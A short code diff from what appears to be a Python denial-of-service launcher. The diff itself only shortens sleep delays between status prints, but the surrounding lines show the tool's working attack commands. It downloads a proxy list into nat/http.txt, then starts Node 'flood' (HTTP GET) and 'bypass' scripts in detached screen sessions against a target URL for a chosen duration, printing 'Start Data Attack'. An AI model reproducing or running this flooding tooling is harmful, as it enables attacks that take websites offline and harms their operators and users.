@@ -114,7 +114,7 @@ class Home:
                         print (f"{Color.LR}Server Error Can Access Website Lost Connection
                         print (f"{Color.LR}Server Error Can Access Website Lost Connection
                         print (f"{Color.LR}Server Error Can Access Website Lost Connection
-                        time.sleep(0.02)
+                        time.sleep(0.01)
                     with open("nat/http.txt", 'w') as p:
                         p.write(httpx.get(http_proxy).text)
                     subprocess.run([f'screen -dm node nat/Method/flood GET {url} nat/http.txt {floodtime} 64 1'], shell=True)
@@ -144,7 +144,7 @@ class Home:
                         print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
                         print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
                         print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
-                        time.sleep(0.03)
+                        time.sleep(0.01)
                     with open("nat/http.txt", 'w') as p:
                         p.write(httpx.get(http_proxy).text)
                     subprocess.run([f'screen -dm node nat/Method/bypass {url} {floodtime}'], shell=True)
